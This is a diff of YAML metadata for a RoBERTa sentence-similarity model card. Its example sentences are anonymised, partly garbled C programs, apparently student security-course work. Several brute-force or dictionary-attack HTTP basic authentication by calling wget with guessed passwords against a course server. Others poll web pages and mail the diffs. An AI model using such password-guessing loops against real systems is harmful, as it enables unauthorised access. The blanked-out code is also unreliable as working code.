+      \ iter++)\n\t{\n\t\tfor (chIter=len-1; chIter>=0; chIter--)\n\t\t{\n\t\t\tif (iter % pow(numOfCh, chIter) == 0) \n\t\
+      \t\t{\n\t\t\t\tcurPos = getChPos(chSet, numOfCh, str[chIter]);\n\t\t\t\tstr[chIter] = chSet[curPos+1];\n\t\t\t}\n\n\t\
+      \t\tif (iter % pow(numOfCh, (chIter+1)) == 0) \n\t\t\t{\n\t\t\t\tif (chIter == len-1)\n\t\t\t\t{\n\t\t\t\t\tstr[chIter]\
+      \ = chSet[sCh];\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tstr[chIter] = chSet[0];\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\
+      \t\tif (func(USERNAME, str, id))\n\t\t{\n\t\t\tprintf(\"\\nPassword found: %s\\n\\n\", str);\n\t\t\tpasswdFound = TRUE;\n\
+      \t\t}\t\t\t\n\t}\n\n\t(str);\n\tstr = NULL;\n\t\n\treturn passwdFound;\n}\n\n\n\nint getChPos(const char chSet[], int\
+      \ numOfCh, char ch)\n{\n\tint i;\n\t\n\tfor (i=0; i<numOfCh; i++)\n\t{\n\t\tif (chSet[i] == ch)\n\t\t{\n\t\t\treturn\
+      \ i;\n\t\t}\n\t}\n\n\treturn -1;\n\t\n}\n\n\n\nchar* initPasswdStr(int len, char ch, char headOfChSet)\n{\n\tint i;\n\
+      \n\tchar *str;\n\n\tstr = malloc(len);\n\n\tif (str)\n\t{\n\t\tfor (i=0; i<len-1; i++)\n\t\t{\n\t\t\tstr[i] = headOfChSet;\n\
+      \t\t}\n\t\tstr[len-1] = ch;\n\t\tstr[len] = '\\0';\n\t}\n\telse\n\t{\n\t\tfprintf(stderr, \"\\nError: Unable  allocate\
+      \ %d bytes memory.\", len);\n\t\texit(EXIT_FAILURE);\n\t}\n\t\n\treturn str;\n}\n\n\n\nint pow(int x, int y)\n{\n\t\
+      int ans = 1, i;\n\t\n\tfor (i=0; i<y; i++)\n\t{\n\t\tans *= x;\n\t}\n\n\treturn ans;\n}\n\n\n\nint crackHTTPAuth(const\
+      \ char *username, const char *passwd, int id)\n{\n\tchar cmd[256];\n\tstruct stat fileInfo;\n\tchar fileToCheck[256];\n\
+      \t\n\tsprintf(cmd, \"wget -O %d -q --http-user=%s --http-passwd=%s --proxy=off %s\", \n\t\t\t\t\t\tid, username, passwd,\
+      \ URL);\n\n\tsystem(cmd);\t\n\n\tsprintf(fileToCheck, \"%d\", id);\n\n\t(void)stat(fileToCheck, &fileInfo); \n\treturn\
+      \ fileInfo.st_size;\n\t\n}\n\n\n"
+    - "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n#include<strings.h>\n#include <ctype.h>\n#include <math.h>\n\
+      #include <sys/time.h>\n\nint\n()\n{\n\n\tint        , end;\n\tFILE           *fp;\n\tint             i, j;\n\tchar \
+      \           input;\n\tchar            password[30];\n\tint             check;\n\n\tfloat           total_time;\n\tint\
+      \             number;\n\t = time();\n\n\n\tif ((fp = fopen(\"words\", \"r\")) == NULL) {\n\t\tfprintf(stderr, \"Error\
+      \ : Failed  open words for .\\n\");\n\t\treturn (EXIT_FAILURE);\n\t}\n\twhile ((input = fgetc(fp)) != EOF) {\n\t\tj\
+      \ = 0;\n\t\tfor (i = 0; i < 30; i++)\n\t\t\tpassword[i] = '\\0';\n\n\t\twhile(input != '\\n' ) {\n\n\t\t\tpassword[j]\
+      \ = input;\n\t\t\tj++;\n\t\t\tinput = fgetc(fp);\n\t\t\t\n\t\t\n\t\t}\n\n\n\t\tif (strlen(password) <= 3) {\n\t\t\t\
+      printf(\"%s\\t\",password);\n\t\t\tfflush(stdout);\n\t\t\tcheck = SysCall(password);\n\t\t\tif (check == 0) {\n\t\t\t\
+      \tgetpid();\n\t\t\t\tend = time();\n\t\t\t\ttotal_time = (end - ) / 1e9;\n\t\t\t\tprintf(\"\\ntotal time_var = %f \"\
+      , total_time);\n\t\t\t\tprintf(\"\\n\\nAvg getpid() time_var = %f usec\\n\", total_time);\n\t\t\t\tprintf(\"\\navg time_var\
+      \  %f / %d = %f\\n\", total_time, number, total_time / number);\n\t\t\t\texit(0);\n\t\t\t}\n\t\t}\n\n\t}\n\n\treturn\
+      \ (EXIT_SUCCESS);\n}\nint\nSysCall(char *password)\n{\n\tchar            url1[255], url2[255], [255];\n\tint       \
+      \      rettype;\n\trettype = 0;\n\tstrcpy(url1, \"wget --non-verbose --http-user= --http-passwd=\");\n\tstrcpy(url2,\
+      \ \" http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n\n\tstrcat(, url1);\n\tstrcat(, password);\n\tstrcat(, url2);\n\
+      \n\trettype = system();\n\t\n\tif (rettype == 0) {\n\t\tprintf(\"Successfully retrieved password: %s\\n\", password);\n\
+      \t\treturn 0;\n\t}\n\tstrcpy(, \"\");\n}\n"
+  - source_sentence: "\n\n\n#include <stdio.h>\n\n#include <stdlib.h>\nint ()\n{\n  int i,j,k,counter =0;\n  char  word[3];\n\
+      \  char paswd[3];\t\n  char get[100];\n  int ;\n  char username[]=\"\";\n  \n  \n  \n  \n  \n\t\t\t\t\n\t\n\tfor (i\
+      \ = 65; i <= 122; i++)\n\t{\n\t\t if(i==91) {i=97;} \n   \n\t\tfor (j = 65; j <= 122; j++)\n\t\t{\n\t\t\n\t\tif(j==91)\
+      \ {j=97;}\n      \n\t\tfor (k = 65; k <= 122; k++)\n\t\t{\n\t\t \n\t\t\tif(k==91) {k=97;}  \n\t\t\t\n\t\t\t word[0]\
+      \ = i;\n\t\t\t word[1] = j;\n\t\t\t word[2] = k;\n\t\t\t sprintf(paswd,\"%c%c%c\",word[0],word[1],word[2]);       \n\
+      \t\t\t counter++;\n\t\t\tprintf(\"%d )%s\\n\\n\", counter, paswd);\n\t\t\t sprintf(get,\"wget --http-user=%s --http-passwd=%s\
+      \ http://sec-crack.cs.rmit.edu./SEC/2/\",username,paswd);\n\t\t\t=system(get);\n\t  \n\t\t\tif(==0) \n\t\t\t{\n\t\t\t\
+      printf(\"The Password has been cracked and it is : %s\" , paswd);\n\t\t\texit(0);\n\t\t\t}\n\t\t}\n     \n\t\t}\n  \n\
+      \t}\n  \n\t\n}\n\n"
+    sentences:
+    - "\n\n#include <stdio.h>\n#include <string.h>\n#include <sys/time.h>\n\n#define OneBillion 1e9\n#define false 0\n#define\
+      \ true 1\nint execPassword(char *, char *b) {\n\n\n    char [100]={'\\0'};\n    strcpy(,b);\n    \n    strcat(,);\n\
+      \    printf (\"Sending command %s\\n\",);\n    if ( system()== 0) {\n       printf (\"\\n password is : %s\",);\n  \
+      \     return 1;\n    }\n    return 0;\n}\n \n\nint bruteForce(char [],char comb[],char *url) {\n\n\nint i,j,k;\n\n \
+      \  for(i=0;i<52 ;i++) {\n        comb[0]= [i];\n        if (execPassword(comb,url)== 1) return 1; \n          for(j=0;j<52;j++)\
+      \ {\n              comb[1] = [j];\n              if(execPassword(comb,url)==1) return 1;\n                for(k=0;k<52;k++)\
+      \ {\n                    comb[2] = [k];\n                    if(execPassword(comb,url)==1) return 1;\n             \
+      \   }\n          comb[1] = '\\0';\n     }\n   }\n   return 0;\n\n} \n\nint  (char *argc, char *argv[]) {\n\n int i,j,k;\n\
+      \ char strin[80] = {'\\0'};\n char *passwd;\n char a[] = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};\n\
+      \ char v[4]={'\\0'};\n int startTime, stopTime, final;\n int flag=false; \n strcpy(strin,\"wget http://sec-crack.cs.rmit.edu./SEC/2/\
+      \ --http-user= --http-passwd=\");\n\n  startTime = time();\n    if (bruteForce(a,v,strin)==1) {\n      stopTime = time();\n\
+      \      final = stopTime-startTime;\n    }\n\n       printf (\"\\n The password is : %s\",v);\n       printf(\"%lld nanoseconds\
+      \ (%lf) seconds \\n\", final,  (double)final/OneBillion );\n\n}\n"
+    - "\n\n#include<stdio.h>\n#include<strings.h>\n#include<stdlib.h>\n#include<ctype.h>\n#define MAX_SIZE 255\n\n\nint  (int\
+      \ argc, char *argv[])\n {\n     FILE *fp;\n     \n   while(1)\n    {       \n      system(\"wget -p http://www.cs.rmit.edu./students\"\
+      );\n\n\n\n      system(\"mkdir data\"); \n      if((fp=fopen(\"./data/index.html\",\"r\"))==NULL)\n       { \n     \
+      \    system(\"cp www.cs.rmit.edu./students/index.html ./data\");\n\t \n       }\n      else\n       {  \n          \
+      \     \n\t \n\t system(\"diff ./data/index.html www.cs.rmit.edu./students/index.html | mail @cs.rmit.edu.\");\n\t system(\"\
+      cp www.cs.rmit.edu./students/index.html ./data\");\n       }     \n\n\n\n      system(\"mkdir images\"); \n      if((fp=fopen(\"\
+      ./images/file.txt\",\"r\"))==NULL)\n       { \n          system(\"md5sum www.cs.rmit.edu./images/*.* > ./images/file.txt\"\
+      );\n\t\t \n       }\n      \n      else\n       {          \n          system(\"md5sum www.cs.rmit.edu./images/*.* >\
+      \ www.cs.rmit.edu./file.txt\");\n\t \n\t \n\t \n\t system(\"diff ./images/file.txt www.cs.rmit.edu./file.txt | mail\
+      \ @cs.rmit.edu.\");\n\t system(\"cp www.cs.rmit.edu./file.txt ./images\");\n       }\n     sleep(86400); \n    }\t\n\
+      \     return (EXIT_SUCCESS);\n  }\n     \n\t   \n\t  \t\n"
+    - "#include<stdio.h>\n#include<string.h>\n#include<strings.h>\n#include<stdlib.h>\n#include<sys/time.h>\n\n\npublic static\
+      \ void main()\n{\n\tint i;\n\tchar ar[100];\n\tFILE* f;\n\tFILE* ;\n\tsystem(\"wget -O first www.rmit.edu./students\"\
+      );  \n\twhile(1)\n\t{\n\t\tsleep(86400);\t\n\t\tsystem(\"rm -f thed\");\n\t\tsystem(\"rm -f new\");\n\t\tsystem(\"wget\
+      \ -O new www.cs.rmit.edu./students\");\t\n\t\tsystem(\"diff new first >thed\");\t\n\t\tf=fopen(\"thed\",\"r\");\n\t\t\
+      if(fgets(ar,100,f)!=NULL)\n\t\t{\t\t\n\t\t\t printf(\"\\n\\n The  has CHANGEDS\");\t\t\n\t\t\tsystem(\"mail @cs.rmit.edu.\
+      \ <thed\"); \n\t\t\tsystem(\"cp new first\");\n\t\t\tfclose(f);\n\t\t}\n\t\telse\n\t\t{\n\t\tfclose(f);\n\t\tprintf(\"\
+      \\n\\nthe  has not changed \");\n\t\t}\n\t}\n\n}\n\n\t\n\t\n\t\n\t\t\n\n\n"
+  pipeline_tag: sentence-similarity
+  library_name: sentence-transformers
+siblings:
+- rfilename: .gitattributes
+- rfilename: 1_Pooling/config.json
+- rfilename: README.md
+- rfilename: config.json
+- rfilename: config_sentence_transformers.json
+- rfilename: merges.txt
+- rfilename: model.safetensors
+- rfilename: modules.json
+- rfilename: sentence_bert_config.json
+- rfilename: special_tokens_map.json
+- rfilename: tokenizer.json
+- rfilename: tokenizer_config.json
+- rfilename: vocab.json
+spaces: []
+createdAt: '2025-07-02T14:15:11.000Z'
+safetensors:
+  parameters:
+    F32: 124645632
+  total: 124645632
+usedStorage: 498604904
+downloadsAllTime: 112
+inferenceProviderMapping: {}
+configJson:
+  architectures:
+  - RobertaModel
+  attention_probs_dropout_prob: 0.1
+  bos_token_id: 0
+  classifier_dropout: null
+  eos_token_id: 2
+  hidden_act: gelu
+  hidden_dropout_prob: 0.1
+  hidden_size: 768
+  initializer_range: 0.02
+  intermediate_size: 3072
+  layer_norm_eps: 1.0e-05
+  max_position_embeddings: 514
+  model_type: roberta
+  num_attention_heads: 12
+  num_hidden_layers: 12
+  output_past: true
+  pad_token_id: 1
+  position_embedding_type: absolute
+  torch_dtype: float32
+  transformers_version: 4.52.4
+  type_vocab_size: 1
+  use_cache: true
+  vocab_size: 50265
+onnxFiles: {}
+safetensorsSizeMb: 498.6
+approxSizeMb: 498.6
+fetchedAt: '2026-06-10T07:15:01.000Z'
